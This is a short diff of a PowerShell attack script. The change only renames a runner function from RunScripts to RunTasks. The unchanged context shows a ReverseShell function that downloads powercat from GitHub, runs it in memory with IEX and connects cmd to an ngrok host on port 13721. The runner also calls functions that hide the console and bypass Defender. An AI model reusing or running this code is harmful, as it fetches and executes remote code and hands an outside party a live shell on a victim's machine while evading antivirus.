@@ -24,11 +24,11 @@ Function ReverseShell(){
 	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 13721 -e cmd
 	}
 
-Function RunScripts(){
+Function RunTasks(){
 	HideConsole
 	OpenMicrosoftEdge
 	DefenderByPass
 	ReverseShell
 	}
 
-RunScripts
+RunTasks
